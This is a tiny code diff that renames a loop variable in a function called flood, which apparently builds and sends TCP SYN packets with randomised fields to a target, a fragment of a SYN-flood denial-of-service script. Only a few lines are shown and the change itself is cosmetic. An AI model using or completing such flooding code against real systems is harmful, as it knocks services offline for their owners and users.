@@ -8,7 +8,7 @@ def flood(target):
         dport=target[1], flags="S", seq=RandShort(), ack=RandShort(), sport=RandShort()
     )
 
-    for i in range(4):
+    for _ in range(4):
         try:
             send(packet, verbose=False)
         except Exception as e:
